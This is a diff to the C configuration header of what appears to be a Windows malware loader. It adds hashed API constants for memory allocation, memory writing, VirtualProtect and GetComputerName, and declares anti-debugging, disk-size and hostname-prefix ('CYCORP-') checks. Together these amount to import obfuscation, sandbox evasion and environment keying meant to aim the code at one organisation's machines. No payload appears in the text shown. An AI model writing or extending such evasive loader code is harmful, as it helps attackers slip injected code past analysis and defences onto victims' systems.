@@ -2,8 +2,8 @@
 #define CONFIG_H
 
 #include <windows.h>
-#include <winternl.h>
 #include <stdio.h>
+
 
 #define HOSTNAME_PREFIX "CYCORP-"
 #define DEBUG_MODE 1
@@ -12,8 +12,10 @@
 #define FALSE 0
 
 #define NTDLL_HASH 0x69e00346   // ROL17
+#define KERNEL32_HASH 0x79e0c5e8 // ROL17
 
-#define QUERY_INFORMATION_PROCESS_HASH 0x7091eca7 // ROR23
+#define QUERY_INFORMATION_PROCESS_HASH 0xcfb70e4c // A:0x7091eca7 // ROR23
+#define GET_COMPUTER_NAME_HASH 0xcfb6e24c // ROR23
 #define VIRTUAL_ALLOC_HASH 0x96124679 // ROR23 NtAllocateVirtualMemory
 #define WRITE_MEMORY_HASH 0x92136911 // ROR23
 #define VIRTUAL_PROTECT_HASH 0xd62f6483 // ROR23
@@ -29,7 +31,8 @@ BYTE is_being_debugged();
 // BYTE is_being_debugged_alternative();
 // int d();
 int get_disk_size();
-// char* h();
+const char* get_hostname(HMODULE hNtdll);
+int starts_with(const char* str, const char* prefix);
 // char* c();
 
 int divide(int a, int b);
@@ -80,6 +83,11 @@ typedef NTSTATUS(NTAPI* NtWaitForSingleObj)(
     HANDLE Handle,
     BOOLEAN Alertable,
     PLARGE_INTEGER Timeout
+);
+
+typedef BOOL(WINAPI* GetComputerNameFunc)(
+    LPSTR lpBuffer,
+    LPDWORD lpnSize
 );
 
 #endif // CONFIG_H
